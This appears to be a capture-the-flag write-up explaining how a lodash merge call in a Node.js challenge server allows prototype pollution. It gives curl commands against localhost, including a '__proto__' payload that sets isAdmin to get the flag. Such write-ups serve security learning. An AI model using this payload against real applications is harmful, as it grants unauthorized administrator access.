# Please Give Me Your Personal Data

- [Please Give Me Your Personal Data](#please-give-me-your-personal-data)
  - [Preface](#preface)
  - [Solution](#solution)

## Preface

I have to admit I was not able to complete this challenge in the actual event. I was not even able to get to the actual challenge, in fact. I banged my head against the wall as I continously read "You must include a username, password, name and birthday!" in the screen (I forgot to include the `Content-Type:application/json` header). I went insane[^1].

Next time, I'll take time to cool off from stuff like this. Should have been an easy 500-ish points :( Who knows if we could've gotten a second place...

## Solution

The challenge is nice because it gives us the source code of the server. We can see there is an endpoint to get the flag which requires us to have a valid account with the `isAdmin` property set to true.

So, the first step is creating our account. We do this via the `/register` endpoint.

```bash
curl -H "Content-Type: application/json" -d '{"username":"user","password":"pass","name":"mee","birthday":"2024-04-13T08:30:00Z"}' 127.0.0.1/register
```

Nice. Now we need admin.

Reading the code for the `/update` endpoint we notice an interesting line:

```js
users.set(username, _.merge(user, req.body));
```

If we take a look at what `_` is:

```js
const _ = require("lodash");
```

I don't use Javascript much (thank god!), so I had no idea what this was. Quick Google seach showed that `merge()` *merged* the two objects! According to the docs, the second object overwrites the first one if they have a shared key.

However, it is not as easy as it may seem, the code prevents us from including the `isAdmin` property in our request object. In order to get around this, we take advantage of Javascript prototypes. I am not going to lie, as a C# guy I never fully understood these things, but I do know that they work as 'backup' properties. So, if we try to access the property `isAdmin` in our object but it doesn't have it, then JS looks for it in the prototype of our object. You get what we can do with this, don't you?

The specific command would be:

```bash
curl -X PATCH -H "Content-Type: application/json" -d '{"username":"user", "password":"pass", "__proto__":{ "isAdmin" : true }}' 127.0.0.1/update
```

Amazing! Now we only need to curl the `/flag` endpoint:

```bash
curl -X GET -H "Content-Type: application/json" -d '{"username":"user","password":"pass"}' 127.0.0.1/flag
```

Aaand the server responds with the **flag** :p

[^1]: *Insanity is doing the same thing over and over again and expecting different results.*